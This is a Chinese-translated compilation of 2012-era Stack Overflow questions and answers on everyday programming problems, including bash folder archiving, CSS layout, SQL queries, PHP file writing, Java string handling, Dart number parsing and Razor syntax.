我有一个文件夹存档，其子文件夹标记为 2012-08-29、2012-10-10、2012-09-01 等，我正在尝试使用 bash 脚本每月将其存档到文件夹中 2012-08、2012- 09、2012-10等

我最初是按周存档的，但发现如果一周中有 2 个不同月份的天数会出现问题，因为其中 1 天或更多天会存档在错误月份的文件夹中。

关于尝试使用简单的 bash 脚本来实现这一点的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T21:12:43.450

基本上，您将每日文件夹从一个月移动`2012-08-*`到一个月文件夹`2012-08`：

```
mv 2012-08-* 2012-08 
```

很简单，不是吗？

# visual-studio - tfs 重新合并不起作用

> ID：13167461
> 
> 赞同：0
> 
> 时间：2012-10-31T21:08:31.057
> 
> 标签：visual-studio, visual-studio-2008, tfs

因此，使用 tfs powertools tfpt 命令在 vs 2008 中成功回滚了我的合并。

我试图重新合并，它说没有变化（但有）。

这让我想起了另一个想法。当我签入我的合并时，即使我只更改了 2 个文件，它也有大约 20 个文件在签入中。现在，当我进行回滚时，它只返回了我更改为签入的 2 个文件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-23T19:39:51.413

那是正常的 TFS 行为。这就是 TFS 回滚的工作原理，TFS 回滚实际上并不是“回滚”，它是一个新的变更集，用旧版本覆盖了最新版本！

您有分支 A（父）和 B（子）。您对 B 进行了一些更改，然后对 A 进行了合并。TFS 现在假定来自 B 的所有更改都存在于 A 中，并使用时间戳更新它的内部数据库。当您回滚 A（父）中的更改时，它不会更改 TFS 对其内部数据库的更新。TFS 只是认为这是一个新的变化！所以对于 TFS，B 和 A 之间没有变化，因为自上次合并以来 B 没有任何变化！说得通？

***“当我签入合并时，即使我只更改了 2 个文件，它也有大约 20 个文件在签入中。现在，当我进行回滚时，它只给我返回了我更改为签入的 2 个文件？”***

当您说合并显示 20 个文件时 -> 如果您打开合并变更集，您实际上可以看到哪些所有文件都得到了编辑，哪些文件刚刚被合并。针对更改集中的每个文件，都会有一个条目说“合并，编辑”/“合并”/“分支”/“删除”等。这些会告诉你特定文件的合并到底发生了什么。

在您的情况下，我假设您在这 18 个文件旁边有“合并”。重命名是我见过的最常见的原因。有许多可能的原因。这不是一个完整的列表：

*   您对标记为“合并”的文件的父文件夹执行了命名空间操作（删除、取消删除、重命名）
*   您执行了已在目标分支中执行的命名空间操作（删除、取消删除、重命名）
*   您执行了一系列命名空间操作，这些操作合并为无操作（例如删除 + 取消删除，或重命名 a -> b -> a）
*   存在未解决的冲突
*   你执行弃牌

# html - 导航栏定位

> ID：13167463
> 
> 赞同：0
> 
> 时间：2012-10-31T21:08:35.047
> 
> 标签：html, css

我不明白为什么我的导航栏没有一直越过顶部！我敢肯定这是一个超级简单的修复。这是一个整页滑块。我只包括了相关的 html/css。希望这就足够了！

HTML

```
<!DOCTYPE>
<link rel="stylesheet" href="style.css" type="text/css" /> 
<link href='http://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic,900italic' rel='stylesheet' type='text/css'>
<head>
<title>Full Page Slider</title>
</head>
  <nav>
    <a id="home">Home</a>
    <a id="">About</a>
    <a id="">Contact</a>
    <div class="sliderButtons"></div>
  </nav>

<div id="full-slider-wrapper">
 <div id="full-slider">    
   <div class="slide-panel active ">
      Panel 1 content here
   </div><div class="slide-panel">
      Panel 2 content here
   </div>
  </div>
</div> 
```

CSS

```
* { margin:0; padding:0; }
p { margin:5px 0 10px 0; }

html {
min-width: 100%;
font-family: 'Lato', sans-serif;
}

nav {

text-align: left;
margin-left: 16%;
border-bottom-style:ridge; 
background-color: FF7400;
  }
 nav a {
font-size:20px;
text-decoration:underline;
display: inline-block;
padding: 1em;
 }

div.sliderButtons {
float: right;
margin-right: 20%;

}

#full-slider-wrapper {
    overflow: hidden;
}

#full-slider {
    position: relative;
    width: 800px;
    height: 600px;
    margin: 0 auto;
}

#full-slider .slide-panel {
    position: absolute;
    top: 0;
    left: 0;
    width: 800px;
    height: 600px;
    visibility: hidden;
}

#full-slider .slide-panel.active {
position: absolute;
    visibility: visible;
}

#full-slider-nav {
    position: relative;
    top: 0;
    right: 0;
}

#full-slider-nav-left, #full-slider-nav-right {
    display: inline-block;
    height: 0;
    width: 0;
    margin-left: 15px;
    border: 20px solid transparent;
    cursor: pointer;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:10:35.077

你的`nav`元素有`margin-left: 16%;`. 更改或删除该规则。

**[jsFiddle 示例](http://jsfiddle.net/j08691/zvdWG/)**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T21:16:27.187

你的意思是 - 为什么它不占用整个宽度？如果是这样 - 仔细观察，您的导航选择器的左边距为 16%

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-01T11:23:01.523

删除`margin-left: 16%;`并更改`text-align: left;`为`text-align:center;`

使用`Div`忘记`nav`

希望它可以帮助你。享受。

# sql - 查询返回具有匹配值的连续行

> ID：13167464
> 
> 赞同：1
> 
> 时间：2012-10-31T21:08:40.010
> 
> 标签：sql, sqlite, datetime

假设我有下表：

```
data_point (creation_datetime DATETIME PRIMARY KEY, 
            data_point INTEGER); 
```

我正在寻找一个 SQL 查询，它不仅会告诉我最新条目的 data_point 值是否为 X，而且它之后有多少连续行也有 X 作为值。

例如，假设以下数据：

```
creation_datetime       data_point
2012-10-31 12:00:00     0
2012-10-31 11:55:00     0
2012-10-31 11:50:00     0
2012-10-31 11:45:00     2
2012-10-31 11:40:00     0 
```

如果我有 X=0，我想要回到这里的数字是 3，因为最近的值匹配 X，接下来的 2 行也匹配它。

我没有任何 ID 列或任何东西。如果需要，我可以添加一个，但我想避免它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T21:21:49.243

```
select count(*) as num
from data_point
where creation_datetime > (
  select max(creation_datetime)
  from data_point
  where data_point <> 0
) 
```

计算最后一条不是您想要的值的记录之后的记录数。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-31T23:41:56.207

```
SELECT max(creation_datetime), data_point, count(*)
FROM  data_points, (
  SELECT max(creation_datetime) time_of_last_data_point 
  FROM data_points 
  WHERE data_point <> (
    SELECT data_point FROM data_points ORDER BY creation_datetime DESC LIMIT 1
  )
) 
WHERE 
  creation_datetime > time_of_last_data_point
GROUP BY 
  data_point 
```

解释：

*   嵌套的 select 语句将找到条目`2012-10-31 11:45:00 | 2`。
*   外部选择仅限于在 之后添加的记录`2012-10-31 11:45:00`。

注意：您必须稍微清理一下才能将其与其他数据库一起使用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-31T21:20:02.723

```
declare @data_point table (creation_datetime DATETIME PRIMARY KEY, data_point INTEGER)
insert @data_point
      select '2012-10-31 12:00:00',     0
union select '2012-10-31 11:55:00',     0
union select '2012-10-31 11:50:00',     0
union select '2012-10-31 11:45:00',     2
union select '2012-10-31 11:40:00',     0

declare @x integer
set @x = 0

--solution 1
select COUNT(*) 
from @data_point 
where data_point = @x
and creation_datetime > 
(
    select max(creation_datetime)
    from @data_point 
    where data_point != @x 
)

--solution 2
select COUNT(*) 
from @data_point a
where data_point = @x
and not exists
(
    select top 1 1
    from @data_point b
    where data_point != @x 
    and a.creation_datetime < b.creation_datetime
) 
```

# .net - 如何在wpf中打印非常大的对象

> ID：13167473
> 
> 赞同：2
> 
> 时间：2012-10-31T21:09:37.527
> 
> 标签：.net, wpf, printing, flowdocument

我需要打印非常大且复杂的对象 - virtualizet 在二维矩阵中，左侧和顶部有两个表格，中间有两个表格代表表格的交叉点。每个表可以有超过 5000 条记录。所以我对所有这些事情进行了控制。它的工作相当不错。但是客户想要打印它。当矩阵对于一页来说太大时，我应该分成和平并打印每个部分。

我可以按纸张大小划分矩阵并为每个部分构建流文档。但它的气味有很多问题。特别是表格具有自定义列数，因此不能将所有列放在一个文档中。

所以，我希望存在任何最简单的方法来实现这一点。（从excel打印除外）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T00:59:02.237

执行此操作的“简单”方法是创建一个与文档大小相同的位图，使用 将文档中的每个控件绘制到此位图`RenderTargetBitmap`，将位图划分为页面矩形的宽度和高度的图块，然后将每个图块绘制到打印机。

不要那样做。

你很快就会发现屏幕上看起来不错的东西在纸上看起来并不好；字体像素化，渐变抖动，文本被截断，文档中的空白区域导致文本在疯狂的位置打印。WPF 控件仅可从 UI 线程获得，并且大量绘制它们可能会导致您的 UI 阻塞。

反而; 利用打印机功能。你有三张桌子？分别打印每个表格。与其尝试绘制 UI，不如`DrawingVisual`为每个单元格或图形创建一个。布置页面上的每个单元格，测试它是否超出边距。如果是这样，请将其添加到水平（如果它超出右边距）或垂直（如果它超出底部边距）斜率列表。绘制完第一页后，在水平斜面上绘制所有视觉效果。继续这样做，直到水平斜面是空的，然后用垂直斜面再次做这一切。然后再下一张桌子。`DrawingVisual`s 不需要 UI 线程，因此您可以在后台执行此操作。

`DocumentPaginator`可能对此有支持；我没试过。祝你好运。

# python - 使用 Bottlepy 从 HTML 表单中获取 INT 值

> ID：13167477
> 
> 赞同：1
> 
> 时间：2012-10-31T21:09:53.313
> 
> 标签：python, forms, int, bottle, iterable

我有一段非常简单的代码，我试图添加 2 个数字。我对python非常缺乏经验，所以我遇到了一些麻烦。我使用python的瓶子框架。

```
from bottle import get, post, request, run, validate
@get('/login') # or @route('/login')
def login_form():
    return '''<form method="POST" action="/login">
<input name="number" type="number" />
<input type="submit" />
</form>'''
@post('/login') # or @route('/login', method='POST')
def login_submit():
    name = request.forms.get('number')
    intnumber = int(number)
    return(intnumber + intnumber) 
```

我遇到的问题是从文本框返回的值是字符串类型。所以我可以很好地连接这两个字符串，但不能将它们转换为 int 来添加它们。它给了我错误

```
TypeError("'int' object is not iterable",) 
```

当它试图转换 intnumber = int(number).

任何有关如何解决此问题以及为什么会发生这种情况的帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-01T02:40:50.460

```
from bottle import get, post, request, run, validate

#bottle.debug(True)

@get('/login') # or @route('/login')
def login_form():
    return '''<form method="POST" action="/login">
<input name="number" type="number" />
<input type="submit" />
</form>'''

@post('/login') # or @route('/login', method='POST')
def login_submit():
    number = request.forms.get('number')
    intnumber = int(number)
    return str(intnumber + intnumber)

run(host='localhost', port=8080) 
```

# c - C - 结构化缓冲区的设计模式？

> ID：13167481
> 
> 赞同：0
> 
> 时间：2012-10-31T21:10:09.053
> 
> 标签：c, data-structures

我有一个 N 字节长的缓冲区，其中 N 至少为 50。此缓冲区采用非常特定的格式，其中前 4 个字节是一个无符号整数，表示缓冲区的长度（包括这四个字节）。接下来的 16 个字节是四个具有不同含义的无符号整数。接下来的 N-20 字节是一些通用的内存缓冲区。

现在，要设置此缓冲区，我会执行以下操作：

```
memcpy((char*)my_buf + 0, &buf_size, 4);    //buf_size is some unsigned int
memcpy((char*)my_buf + 4, &prop0, 4);    //buf_size is some unsigned int
memcpy((char*)my_buf + 8, &prop1, 4);    //buf_size is some unsigned int
memcpy((char*)my_buf + 12, &prop2, 4);    //buf_size is some unsigned int
memcpy((char*)my_buf + 16, &prop3, 4);    //buf_size is some unsigned int
//Many more bytes used as a generic buffer 
```

但是，这似乎非常不雅。在这一点上，我想询问社区是否有一种更优雅的方法可以在给定初始地址时将特定值分配给特定的内存偏移量。

我考虑过使用结构，但 IIRC 结构不保证其成员在内存中的放置顺序，而且我不知道结构如何表示缓冲区的尾部，即通用内存空间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:16:42.523

> 结构不保证其成员在内存中的放置顺序

那是假的。订单有保证。最终编译器可以引入一些填充。但是您正在使用多个 4 字节，因此不应发生填充（至少在 32 位体系结构中，您是什么？）。

看看这个[线程](https://stackoverflow.com/questions/281045/do-class-struct-members-always-get-created-in-memory-in-the-order-they-were-decl)`C`，特别是对这两个和`C++`标准的引用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T21:23:30.553

您至少应该使用`sizeof(unsigned int)`而不是 4 或 4 的倍数：

```
memcpy((char*)my_buf + 0, &buf_size, sizeof(unsigned int));
memcpy((char*)my_buf + 1 * sizeof(unsigned int), &prop0, sizeof(unsigned int));
memcpy((char*)my_buf + 2 * sizeof(unsigned int), &prop1, sizeof(unsigned int));
memcpy((char*)my_buf + 3 * sizeof(unsigned int), &prop2, sizeof(unsigned int));
memcpy((char*)my_buf + 4 * sizeof(unsigned int), &prop3, sizeof(unsigned int)); 
```

如果您的内存以 s 的倍数组织`unsigned int`，您还可以使用 unsigned int 数组：

```
unsigned int my_buf[X];

my_buf[0] = buf_size; // better yet, use sizeof(my_buf)!
my_buf[1] = prop0;
my_buf[2] = prop1;
my_buf[3] = prop2;
my_buf[4] = prop3; 
```

或使用其他人已经指出的结构。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T21:19:16.610

创建您的结构并相信内存按您所说的那样布置。

结构中的最后一个字段可以是

```
struct MyStruct {

   // your fields above here...
   char generic[];
}; 
```

创建结构实例时，您需要知道通用内存的大小。

```
MyStruct* instance = malloc(sizeof(MyStruct) + genericBytes); 
```

要访问通用部分，请使用通用字段。

```
instance->generic[i] = something; 
```

@Heisenbug 是对的，但如果填充成为问题，请在结构定义之前和之后使用 pad pragma。

```
#pragma pad(1)
// ... your struct
#pragma pad() 
```

# ajax - 远程表单呈现为 HTML 而不是 JS

> ID：13167484
> 
> 赞同：0
> 
> 时间：2012-10-31T21:10:32.080
> 
> 标签：ajax, ruby-on-rails-3, forms

我有一个简单的表格：

```
<%= form_for [current_user, @bookcase], :id => "shelf_update_form", :remote => true, :html => { :multipart => true} do |f| %>
  <input id="bookcase_image" class="file" type="file" name="bookcase[image]" size="13">
<% end %> 
```

选择文件后会自动上传：

```
$("#shelf_update_form").change(function() {
  $("#shelf_update_form").submit();
}); 
```

我希望更新操作呈现 js 视图，但默认情况下它呈现 html。我尝试强制它像这样渲染 js：

```
respond_to do |format|
  format.js
end 
```

但后来我得到这个错误：

```
NetworkError: 406 Not Acceptable 
```

即便如此，我的日志报告：

```
Processing by BookcasesController#update as HTML 
```

我怎样才能让它作为 JS 处理呢？

更新：

风景：

```
triggerAjaxHistory("<%= @href %>", false); 
```

我也用更通用的视图得到了相同的结果：

```
alert("I work now!") 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T21:47:54.523

1.  在控制器中，执行

    ```
    respond_to do |format|
      format.js if request.xhr?
    end 
    ```

2.  您的视图命名为`.js.erb`?

3.  您可以在浏览器中使用 firebug 检查您得到的响应到底是什么吗？打开网络日志并查看响应。
4.  您的布局中是否还有以下内容？

    ```
    <%= javascript_include_tag :defaults %>
    <%= csrf_meta_tag %> 
    ```

5.  您可以输入`logger.info whatever_message`命令以确保您执行控制器操作并进入正确的视图吗？
6.  如果您在控制器中专门指定 js 格式会发生什么情况

    ```
     class UserController < ApplicationController
       respond_to :js, :only => :update, :layout => 'false` 
    ```

7.  如果您将格式指定`form_for`为`:format => :js`
8.  您的表单是否嵌套在另一个表单中？

# android - 在 PhoneGap 和 Jquery Mobile 中拖放

> ID：13167491
> 
> 赞同：0
> 
> 时间：2012-10-31T21:11:13.863
> 
> 标签：android, jquery-ui, cordova, jquery-mobile, drag-and-drop

我搜索了线程，发现在移动设备中拖放需要使用 Jquery UI 并使用 prevent default 来执行此操作，但我的不起作用。我尝试了 UI 触摸打孔它仍然无法工作，我不确定我错过了哪一步。我在移动设备中的屏幕上下拖动，有时会错过 LogCat 的拖动操作。

```
<script type="text/javascript" src="cordova-1.7.0.js"></script>
<script type="text/javascript" src="jquery-1.7.2.min.js"></script>
<script type="text/javascript" src="jquery.mobile-1.1.0.min.js"></script>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.9/jquery-ui.min.js"></script> 
```

JS文件

```
 $( document ).delegate("#game", "pageshow", function() {
  $('.box0').draggable();
  $('.box1').draggable();
  $('.box2').draggable();
  $('body>div').bind("dragstart", function(event, ui){
      event.stopPropagation();
  });
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-02T09:45:22.097

也许你可以看到这个[http://forresst.github.com/2012/06/22/Make-a-list-jQuery-Mobile-sortable-by-drag-and-drop/](http://forresst.github.com/2012/06/22/Make-a-list-jQuery-Mobile-sortable-by-drag-and-drop/)

我不知道它是否适用于PhoneGap

# php - 如何在 PHP 中使用 fwrite() 编写多个变量？

> ID：13167492
> 
> 赞同：3
> 
> 时间：2012-10-31T21:11:13.910
> 
> 标签：php, variables, text

我有一个将变量写入文本文件的脚本，我正在使用 fwrite()。这是脚本：

```
<?php

error_reporting(E_ALL ^ E_NOTICE);

$filename = 'Report.txt';

$batch_id = $_GET['batch_id'];
$status = $_GET['status'];
$phone_number = $_GET['phone_number'];

//check to see if I could open the report.txt
    if (!$handle = fopen($filename, 'a')) {
         echo "Cannot open file ($filename)";
         exit;
    }

    // I am trying to write each variables to the text file
    if (fwrite($handle, $phone_number) === FALSE) {
        echo "Cannot write to file ($filename)";
        exit;
    }

    echo "Success, wrote ($phone_number) to file ($filename)";

    fclose($handle);

?> 
```

我在这里有两个问题：

1.当我通过 Batch_ID 收到报告时，我想使用 batch_ID 为每个报告文本文件命名，例如：5626_Report.txt

2.我想将多个变量传递给函数fwrite()，我想在每个$phone_number 旁边写下$status。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T21:17:00.527

试试 fprintf。

它类似于 C 的常规 printf，但是您需要将句柄传递给。举个例子：

```
fprintf($handle, "%s;%s;%s", $batch_id, $status, $phone_number); 
```

或者，您可以使用 PHP 内联字符串并使用：

```
fwrite($handle "$batch_id;$status;$phone_number"); 
```

要解决您的确切问题：

```
$filename = $batch_id."_report.txt";
$handle = fopen($filename, "a");
fwrite($handle, "$phone_number $status"); 
```

那应该有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:20:52.197

你可以做的更简单：

```
$status = $_GET['status'];
$phone_number = $_GET['phone_number'];

$file = $_GET['batch_id']."_Report.txt";
//place here whatever you need
$content = "Some content".$status."\n";
file_put_contents($file, $current); 
```

# django - Amazon S3 的访问被拒绝错误

> ID：13167493
> 
> 赞同：5
> 
> 时间：2012-10-31T21:11:37.587
> 
> 标签：django, amazon-s3, boto, django-storage

我在使用 Amazon S3 时收到拒绝访问错误，但不知道原因。

我的设置如下：

`STATIC_URL = 'http://s3.amazonaws.com/%s/' % AWS_STORAGE_BUCKET_NAME`

什么会导致访问被拒绝错误？我已经验证我的密钥是正确的。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-01T13:29:52.587

您在上面显示的 URL 将解析为 S3 中的存储桶。为了使用这样的 URL 成功访问该存储桶，存储桶的权限必须授予对该存储桶的“公共读取”访问权限。此外，存储桶中的每个对象或文件也必须授予“公共读取”访问权限。

您是否希望任何人都可以读取存储桶和存储桶中的所有内容？如果是这样，请确保正确设置了权限。但是请注意，向存储桶本身授予“公共读取”权限将允许任何人列出存储桶的内容。这通常是不必要的，可能应该避免。

另请注意，密钥（我假设您的意思是您的 AWS 访问密钥和秘密密钥）仅在您通过 API 访问 S3 时适用。如果您只是通过浏览器使用 URL 访问它，则不会在请求中使用凭据。

# java - 用Java删除字符串中的所有元音

> ID：13167495
> 
> 赞同：4
> 
> 时间：2012-10-31T21:11:43.487
> 
> 标签：java, java.util.scanner

我正在为我的计算机科学课程做作业。任务是获取用户输入，删除所有元音，然后打印新语句。

我知道我可以很容易地用这段代码做到这一点：

```
string.replaceAll("[aeiou](?!\\b)", "") 
```

但是我的导师希望我使用嵌套的 if 和 else if 语句来实现结果。现在我正在使用这样的东西：

```
if(Character.isLetter('a')){
    'do something'
}else if(Character.isLetter('e')){
    'do something else' 
```

`if`但我不确定在and`else if`语句中该做什么。我应该删除这封信吗？还是有更好的方法来做到这一点？

鉴于这是我的作业，我不想要完整的答案只是提示。谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-31T21:13:43.250

我认为他可能想要你读取字符串，创建一个新的空字符串（调用它`s`），循环输入并添加所有不是元音的字符`s`（这需要一个`if`语句）。然后，您只需打印`s`.

* * *

**编辑：**您可能需要考虑使用 a [`StringBuilder`](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/StringBuilder.html)，因为重复的字符串连接会影响性能，但想法是一样的。但老实说，我怀疑这会对这类事情产生明显的影响。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-31T21:14:41.823

```
Character.isLetter('a') 
```

[Character.isLetter(char)](http://docs.oracle.com/javase/6/docs/api/java/lang/Character.html#isLetter%28char%29)告诉你你给它的值是否是一个字母，这在这种情况下没有帮助（你已经知道“a”是一个字母）。

您可能想使用相等运算符 ,`==`来查看您的角色是否为“a”，例如：

```
char c = ...
if(c == 'a') {
    ...
} else if (c == 'e') {
    ...
} 
```

您可以通过多种方式获取 String 中的所有字符：

*   作为带有[String.toCharArray()的数组](http://docs.oracle.com/javase/6/docs/api/java/lang/String.html#toCharArray%28%29)
*   [使用String.charAt(index)](http://docs.oracle.com/javase/6/docs/api/java/lang/String.html#charAt%28int%29)从字符串中获取每个字符

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-31T21:20:25.783

我认为您可以遍历字符检查是否为元音，如下所示：

```
 define a new string 
  for(each character in input string)
    //("aeiou".indexOf(character) <0) id one way to check if character is consonant
    if "aeiou" doesn't contain the character  
      append the character in the new string 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-10-31T21:47:04.883

如果你想在 O(n) 时间内完成

*   遍历字符串的字符数组
*   如果您击中元音，则跳过索引并将下一个非元音字符复制到元音位置。
*   您将需要两个计数器，一个遍历整个字符串，另一个跟踪最后一个元音位置。
*   到达数组末尾后，查看元音跟踪器计数器 - 它是否位于元音上，如果不是，则可以从索引 0 到“vowelCounter-1”构建新字符串。

如果你在 Java 中这样做，你将需要额外的空间来构建新的字符串等。如果你在 C 中这样做，你可以简单地用空字符终止字符串并在没有任何额外空间的情况下完成程序。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-10-31T21:20:58.433

我不认为你的教练想让你打电话`Character.isLetter('a')`，因为它总是`true`。

在不使用正则表达式的情况下构建结果的最简单方法是使用 a `StringBuilder`and a`switch`语句，如下所示：

```
String s = "quick brown fox jumps over the lazy dog";
StringBuffer res = new StringBuffer();
for (char c : s.toCharArray()) {
    switch(c) {
        case 'a': // Fall through
        case 'u': // Fall through
        case 'o': // Fall through
        case 'i': // Fall through
        case 'e': break; // Do nothing
        default: // Do something
    }
}
s = res.toString();
System.out.println(s); 
```

您也可以将其替换为等效的`if`，如下所示：

```
if (c!='a' && c!='u' && c!='o' && c!='i' && c!='e') {
    // Do something
} 
```

# string - 如何使用 Dart 将字符串解析为数字？

> ID：13167496
> 
> 赞同：205
> 
> 时间：2012-10-31T21:11:46.167
> 
> 标签：string, parsing, dart

我想将字符串解析为整数和双精度数`1`。`32.23`我怎样才能用 Dart 做到这一点？

* * *

## 回答 #1

> 赞同：314
> 
> 时间：2012-10-31T21:11:46.167

您可以使用 将字符串解析为整数`int.parse()`。例如：

```
var myInt = int.parse('12345');
assert(myInt is int);
print(myInt); // 12345 
```

请注意，`int.parse()`接受`0x`带前缀的字符串。否则，输入被视为 base-10。

您可以使用 将字符串解析为双精度`double.parse()`。例如：

```
var myDouble = double.parse('123.45');
assert(myDouble is double);
print(myDouble); // 123.45 
```

`parse()`如果无法解析输入，将抛出 FormatException。

* * *

## 回答 #2

> 赞同：123
> 
> 时间：2018-04-16T13:03:28.470

在 Dart 2[中 int.tryParse](https://api.dartlang.org/dev/2.0.0-dev.53.0/dart-core/int/tryParse.html)可用。

它为无效输入返回 null 而不是抛出。你可以像这样使用它：

```
int val = int.tryParse(text) ?? defaultValue; 
```

* * *

## 回答 #3

> 赞同：50
> 
> 时间：2020-12-15T11:21:36.510

### 将字符串转换为整数

```
var myInt = int.parse('12345');
assert(myInt is int);
print(myInt); // 12345
print(myInt.runtimeType); 
```

### 将字符串转换为双精度

```
var myDouble = double.parse('123.45');
assert(myInt is double);
print(myDouble); // 123.45
print(myDouble.runtimeType); 
```

### [DartPad 中的示例](https://dartpad.dev/5bddb5fb077c3f0e63db88c33fdbb1f1?)

[![飞镖盘截图](../Images/3fff8f3d4ed751dbd8922011d74eaff8.png)](https://i.stack.imgur.com/ZdxNM.png)

* * *

## 回答 #4

> 赞同：12
> 
> 时间：2020-06-26T13:29:11.903

```
 void main(){
  var x = "4";
  int number = int.parse(x);//STRING to INT

  var y = "4.6";
  double doubleNum = double.parse(y);//STRING to DOUBLE

  var z = 55;
  String myStr = z.toString();//INT to STRING
} 
```

> int.parse() 和 double.parse() 在无法解析字符串时会抛出错误

* * *

## 回答 #5

> 赞同：12
> 
> 时间：2020-04-14T17:24:33.230

**根据飞镖 2.6**

的可选`onError`参数`int.parse`已**弃用**。因此，您应该`int.tryParse`改用。

**注**：同样适用于`double.parse`。因此，请`double.tryParse`改用。

```
 /**
   * ...
   *
   * The [onError] parameter is deprecated and will be removed.
   * Instead of `int.parse(string, onError: (string) => ...)`,
   * you should use `int.tryParse(string) ?? (...)`.
   *
   * ...
   */
  external static int parse(String source, {int radix, @deprecated int onError(String source)}); 
```

不同之处在于如果源字符串无效则`int.tryParse`返回。`null`

```
 /**
   * Parse [source] as a, possibly signed, integer literal and return its value.
   *
   * Like [parse] except that this function returns `null` where a
   * similar call to [parse] would throw a [FormatException],
   * and the [source] must still not be `null`.
   */
  external static int tryParse(String source, {int radix}); 
```

因此，在您的情况下，它应该如下所示：

```
// Valid source value
int parsedValue1 = int.tryParse('12345');
print(parsedValue1); // 12345

// Error handling
int parsedValue2 = int.tryParse('');
if (parsedValue2 == null) {
  print(parsedValue2); // null
  //
  // handle the error here ...
  //
} 
```

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2020-08-21T15:22:52.643

你可以用 . 解析字符串`int.parse('your string value');`。

例子：-`int num = int.parse('110011'); print(num); // prints 110011 ;`

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2021-06-27T05:30:26.840

以上解决方案不适用于`String`：

```
String str = '123 km'; 
```

因此，对我来说适用于任何情况的单行答案将是：

```
int r = int.tryParse(str.replaceAll(RegExp(r'[^0-9]'), '')) ?? defaultValue;
or
int? r = int.tryParse(str.replaceAll(RegExp(r'[^0-9]'), '')); 
```

但请注意，它不适用于以下类型的字符串

```
String problemString = 'I am a fraction 123.45';
String moreProblem = '20 and 30 is friend'; 
```

如果您想提取适用于各种类型的双精度，请使用：

```
double d = double.tryParse(str.replaceAll(RegExp(r'[^0-9\.]'), '')) ?? defaultValue;
or
double? d = double.tryParse(str.replaceAll(RegExp(r'[^0-9\.]'), '')); 
```

这将适用于`problemString`但不适用于`moreProblem`.

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2022-01-05T06:40:47.070

```
String age = stdin.readLineSync()!; // first take the input from user in string form
int.parse(age);  // then parse it to integer that's it 
```

# sql-server - MVC 4 默认数据库有多安全？

> ID：13167499
> 
> 赞同：0
> 
> 时间：2012-10-31T21:11:50.103
> 
> 标签：sql-server, asp.net-mvc

我在 MVC 4 上有点新，我正在努力学习它。我想问一下 mvc 4 默认数据库有多安全。

当我配置项目并启用角色授权时，它会创建一个 ASPNETDB.mdf。我可以在一个大项目中信任它及其默认数据库吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T21:15:40.010

据我所知，默认情况下，asp.net 创建 MSSQL Server Compact 数据库（localfile 数据库）。它不能用作高负载项目的数据库。因此，您需要将其迁移到 MSSQL Server 的普通版本。为此，您需要使用 Aspnet_regsql.exe 工具。

# asp.net-mvc - Razor 语法在下划线后无法识别“@”

> ID：13167504
> 
> 赞同：1
> 
> 时间：2012-10-31T21:12:08.740
> 
> 标签：asp.net-mvc, razor

我正在尝试执行以下操作：

```
@foreach(var p in @Model.line_products){
<img class="small_img_@Model.line_products[i].short_name" src="/Content/images/@Model.line_products[i].image_name" />
} 
```

这不起作用，它按原样呈现文本，不识别'@'。我在 Stackoverflow 中找到了[另一个帖子](https://stackoverflow.com/questions/4377317/razor-view-syntax-doesnt-recognize-the-in-an-html-attribute)，它建议按以下方式添加括号：

```
@foreach(var p in @Model.line_products){
<img class="small_img_(@Model.line_products[i].short_name)" src="/Content/images/@Model.line_products[i].image_name" />
} 
```

使用此解决方法，我得到我的 id 呈现为 small_img_( **MODEL ATTRIBUTE** )。没有不需要添加特定字符的解决方法吗？（如括号）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T21:16:42.190

你有比一个简单的undercore问题更多的错误。您不能在 if 中使用 @Model。您已经在 @ 块中。只需使用`@foreach(var p in Model.line_products)`.

另外，你写括号的方式，它们会被渲染。你想要的是

```
small_img_@(Model.line_products[i].short_name) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-31T21:15:32.650

将括号放在后面`@`而不是前面：

```
class="small_img_@(Model.line_products[i].short_name)" 
```

# python - python中的阿拉伯语正则表达式和MySQLdb

> ID：13167505
> 
> 赞同：1
> 
> 时间：2012-10-31T21:12:09.240
> 
> 标签：python, unicode, base64, arabic, mysql-python

我试图从网页中获取某些阿拉伯语字符串，然后将这些字符串存储到数据库中。

**第一个问题**

`.`我能做的唯一方法是通过使用和使用 unicode来指定它们有多少个字母，如下所示：

```
import urllib,re
content=urllib.urlopen("http://example.com/content.html").read()
content = unicode(content,"utf-8")
Strings = re.findall("<Strong>...........</strong>",content) # it will work fine and fetch it but only strings with 11 char or letter (11 place) 
```

**第二个问题**

当我尝试将其写入文本文件时，它显示：

> UnicodeEncodeError：“ascii”编解码器无法对位置 0-3 中的字符进行编码：序数不在范围内（128）

